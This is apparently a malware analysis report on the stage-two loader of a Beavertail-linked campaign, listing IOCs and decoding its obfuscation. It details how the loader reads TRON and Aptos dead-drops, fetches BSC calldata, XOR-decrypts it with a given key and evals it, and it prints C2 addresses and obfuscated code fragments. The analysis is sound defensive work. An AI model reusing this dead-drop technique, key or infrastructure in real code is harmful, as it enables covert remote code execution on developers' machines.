# Task AB: RS260605 Stage 2 — Generator-Function Obfuscation Analysis

## Overview

File: `/tmp/stage2_live_admin_67k.js` (67,583 bytes)  
Build marker: `/*RS260605*/` = Release Stamp June 5, 2026  
Format: WJS generator-function obfuscation (`function*` + `while`+`switch`+`with`)  
Source: Fetched live from `166.88.134.62:443/0x/js` (C2 admin endpoint)  
Companion: `/tmp/stage2_live_prod_70k.js` (69,972 bytes, from `198.105.127.210:443/0x/js`)

## Architecture

RS260605 Stage 2 is a **pure blockchain dead-drop updater** — NOT a standalone RAT.

Its sole purpose: check three blockchain dead-drops for a BSC transaction hash, fetch that BSC transaction, XOR-decrypt its calldata, and `eval()` the result as Stage 3. If the blockchain is empty, it exits silently. The primary Beavertail RAT functionality is in Stage 3 (delivered via the blockchain), not in Stage 2 itself.

Stage 2 is delivered to victims via the C2 endpoint `/$/boot` (XOR-encrypted with `ThZG+0jfXE6VAGOJ`).

## Confirmed Execution Flow (Live Instrumentation)

Full chain reconstructed via async instrumentation with mocked network:

### Step 1 — TRON Dead-Drop (Primary)
```
GET https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
    ?only_confirmed=true&only_from=true&limit=1
```
- Watches **OUTGOING** confirmed transactions FROM W1 (actor pushes new payloads by sending a tx)
- Parse: `data[0].raw_data.contract[0].parameter.value.data` → hex-encoded BSC tx hash

### Step 2 — Aptos Dead-Drop (Fallback)
```
GET https://fullnode.mainnet.aptoslabs.com/v1/accounts/
    0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e/transactions?limit=1
```
- Parse: `[0].payload.function` → hex-encoded BSC tx hash

### Step 3 — BSC Payload Fetch
```
POST https://bsc-dataseed.binance.org       (primary)
POST https://bsc-rpc.publicnode.com         (fallback)
```
- JSON-RPC `eth_getTransactionByHash` with hash from Step 1 or 2
- Parse: `result.input` → XOR-decrypt with `ThZG+0jfXE6VAGOJ` (repeating) → eval as Stage 3

### Exit
If all three dead-drops return empty / no valid hash: **exits silently**. No local persistence or C2 connection in Stage 2 itself.

## Infrastructure IOCs

| Type | Value | Notes |
|------|-------|-------|
| TRON wallet | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | W1 — same as Stage 1 |
| Aptos address | `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | A1 — same as Stage 1 |
| BSC RPC | `bsc-dataseed.binance.org` | Public Binance RPC |
| BSC RPC | `bsc-rpc.publicnode.com` | Public fallback |
| XOR key | `ThZG+0jfXE6VAGOJ` | Stage 2 → Stage 3 decrypt key |
| Build date | `RS260605` = 2026-06-05 | Release stamp in payload marker |
| C2 delivery | `/$/boot` over `166.88.134.62:443` and `198.105.127.210:443` | Stage 2 download endpoint |

**TRON query change from Stage 1**: Stage 1 used `only_to=true` (incoming txs). Stage 2 uses `only_from=true` (outgoing txs). Both W1 addresses are identical — the actor changed their push mechanism between Stage 1 and Stage 2.

## Obfuscation Structure

### Outer Generator
```javascript
function*vVL9lkD(eDtWRj, oB8371, DtJ1uFR={HCRVhxw:{}}, FlUWAiM) {
  while(eDtWRj + oB8371 !== 0x5a)        // exit when state = 90
    with(DtJ1uFR.OwzVEFe || DtJ1uFR)     // flatten nested state into local scope
      switch(eDtWRj + oB8371) { ... }    // 401 case labels
}
vVL9lkD(-0x1d, -0x39).next().value       // entry: state = -86
```

- 401 total case labels; dynamic case expressions (many reference state variables)
- `with()` scope injection flattens nested generator state into the outer switch
- Multiple nested async functions: `cg9xis(url)` (HTTPS GET wrapper), `pMhS5y(url, headers, cb)` (HTTPS request wrapper)

### String Table
```javascript
// 194 encrypted strings in yUvOUI[]:
DtJ1uFR.HCRVhxw.nuTE_k = {}
DtJ1uFR.HCRVhxw.yUvOUI = ["Xh?*^VbV~*", ".t8:IeJ0E`+1b7M...", ...]
```

Two string accessors share the same `yUvOUI` array:
- **`K1oFySu.DjXats(i)`** — outer accessor (used in network-calling code)
- **`HCRVhxw.HcqZTQp(i)`** — inner accessor (sH1QHz cipher, used in inner generators)

### sH1QHz String Cipher (Inner)
```
Alphabet: sbCiN~Ql:5;(I1%9]mfeOXPrEMRkBvSn/"<!W2qo`p}aHwJ^d_K@A,3g8c[hZ0F+.64*U$G#zD=Yuy>Ljt{T|7x)?&V
          (91 characters, shuffled)
Factor:   91
Encoding: VLQ base-91
Output:   byte array → String.fromCharCode
```

Confirmed decodes:
- `yUvOUI[116]` = `"E3&@e"` → **`JSON`**
- `yUvOUI[117]` = `"NNAyn#s"` → **`parse`**

(Usage: `JSON.parse(tron_response_body)` in TRON tx callback)

### Key Nested Functions
```javascript
HCRVhxw.HcqZTQp = function(...args) {
    return vVL9lkD(0x35, -0x11f, {HCRVhxw: ctx, uiQs1cZ: {}}, args).next().value
}
HCRVhxw.SztRXO = function(...args) {
    return vVL9lkD(-0x123, 0xb3, {HCRVhxw: ctx, mbEWdNe: {}}, args).next().value
}
oiaM4Hw = function(...args) {
    return vVL9lkD(0x9d, 0x4e, {HCRVhxw: ctx, F7DLeC: {}}, args).next().value
}
K1oFySu.DjXats = function(...args) {
    return FlUWAiM(-0x12c, 0x61, 0x135, {K1oFySu: ctx, ilTcOI: {}}, args).next().value
}
```

## Comparison: Stage 1 vs Stage 2 Dead-Drop

| Attribute | Stage 1 (sfL IIFE) | Stage 2 (RS260605) |
|-----------|--------------------|--------------------|
| TRON wallet | W1 `TMfKQEd7...` | W1 `TMfKQEd7...` (same) |
| TRON query | `only_to=true` (incoming) | `only_from=true` (outgoing) |
| Aptos address | A1 `0xbe037400...` | A1 `0xbe037400...` (same) |
| BSC RPC | Not observed in Stage 1 | `bsc-dataseed.binance.org`, `bsc-rpc.publicnode.com` |
| Decrypt key | Not Stage 2 key | `ThZG+0jfXE6VAGOJ` |
| On empty | Falls through to embedded Beavertail | Exits silently |

## Self-Update Mechanism

The actor's operational model:
1. Infect developer via `astro.config.mjs` → Stage 1 runs on `astro dev`/`astro build`
2. Stage 1 connects to C2 (`/$/boot`) and receives Stage 2 (XOR-encrypted with `ThZG+0jfXE6VAGOJ`)
3. Stage 2 checks TRON/Aptos for BSC hash
4. Actor controls Stage 3 deployment by sending TRON transactions FROM W1 (or posting to Aptos A1)
5. All infected machines simultaneously receive the new Stage 3 payload via BSC

This means Stage 3 (the active RAT) can be **updated across all victims simultaneously** by a single TRON transaction from W1, with no direct contact to individual victim machines.

## Instrumentation Notes

- Three earlier async attempts (`instrument_ab.js`–`ab3.js`) failed: async callbacks fired after vm context closed, or synchronous mock broke payload's Promise chains
- Working approach (`instrument_ab6.js`): real async in vm + properly chainable HTTP mock + `unhandledRejection` handler
- The payload uses `async/await` + `Promise` extensively — a synchronous mock is incompatible
- Final crash: `Cannot read properties of null (reading 'input')` when BSC returns `result: null` for a synthetic tx hash — confirms the BSC `result.input` parsing path
